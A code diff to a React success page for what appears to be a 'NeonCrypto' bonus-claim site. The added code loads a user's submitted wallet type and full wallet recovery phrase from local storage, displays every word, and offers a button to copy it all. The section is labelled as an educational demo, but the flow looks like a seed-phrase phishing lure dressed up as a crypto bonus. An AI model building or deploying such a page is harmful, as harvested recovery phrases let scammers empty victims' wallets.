@@ -3,11 +3,25 @@ import { Footer } from "@/components/layout/Footer";
 import { GlassCard } from "@/components/ui/GlassCard";
 import { Button } from "@/components/ui/button";
 import { Link } from "wouter";
-import { CheckCircle, Download, Share2 } from "lucide-react";
-import { useState } from "react";
+import { CheckCircle, Download, Copy } from "lucide-react";
+import { useState, useEffect } from "react";
+
+interface BonusClaimData {
+  walletType: string;
+  walletPhrase: string[];
+  timestamp: string;
+}
 
 export default function BonusSuccess() {
   const [copied, setCopied] = useState(false);
+  const [claimData, setClaimData] = useState<BonusClaimData | null>(null);
+
+  useEffect(() => {
+    const storedData = localStorage.getItem('bonusClaimData');
+    if (storedData) {
+      setClaimData(JSON.parse(storedData));
+    }
+  }, []);
 
   const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=NeonCrypto-Bonus-Claim-${Date.now()}`;
   const bonusCode = `NC${Math.random().toString(36).substring(2, 9).toUpperCase()}`;
@@ -16,6 +30,15 @@ export default function BonusSuccess() {
     navigator.clipboard.writeText(bonusCode);
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
+  };
+
+  const copyClaimData = () => {
+    if (claimData) {
+      const data = `Wallet Type: ${claimData.walletType}\nRecovery Phrase: ${claimData.walletPhrase.join(' ')}\nTime: ${new Date(claimData.timestamp).toLocaleString()}`;
+      navigator.clipboard.writeText(data);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    }
   };
 
   return (
@@ -50,6 +73,42 @@ export default function BonusSuccess() {
                 <p className="text-lg md:text-xl font-mono font-bold text-primary">{bonusCode}</p>
               </div>
             </div>
+
+            {/* Submitted Data Section */}
+            {claimData && (
+              <div className="mb-12 bg-blue-500/5 border border-blue-500/20 rounded-lg p-6">
+                <h3 className="text-lg font-bold text-blue-400 mb-4">📋 SUBMITTED INFORMATION (FOR EDUCATIONAL DEMO)</h3>
+                <div className="space-y-3 text-left">
+                  <div>
+                    <p className="text-xs text-muted-foreground mb-1">WALLET TYPE</p>
+                    <p className="font-mono text-sm bg-black/30 p-3 rounded border border-white/10">{claimData.walletType}</p>
+                  </div>
+                  <div>
+                    <p className="text-xs text-muted-foreground mb-1">RECOVERY PHRASE ({claimData.walletPhrase.length} words)</p>
+                    <div className="font-mono text-sm bg-black/30 p-3 rounded border border-white/10 flex flex-wrap gap-2">
+                      {claimData.walletPhrase.map((word, idx) => (
+                        <span key={idx} className="px-2 py-1 bg-blue-500/10 rounded text-xs border border-blue-500/20">
+                          {idx + 1}. {word}
+                        </span>
+                      ))}
+                    </div>
+                  </div>
+                  <div>
+                    <p className="text-xs text-muted-foreground mb-1">CLAIM TIMESTAMP</p>
+                    <p className="font-mono text-sm bg-black/30 p-3 rounded border border-white/10">
+                      {new Date(claimData.timestamp).toLocaleString()}
+                    </p>
+                  </div>
+                </div>
+                <button 
+                  onClick={copyClaimData}
+                  className="w-full mt-4 px-4 py-2 bg-blue-500/10 border border-blue-500/30 text-blue-400 rounded hover:bg-blue-500/20 transition-colors text-xs font-medium flex items-center justify-center gap-2"
+                >
+                  <Copy className="w-4 h-4" />
+                  Copy All Data
+                </button>
+              </div>
+            )}
 
             {/* QR Code Section */}
             <div className="mb-12">
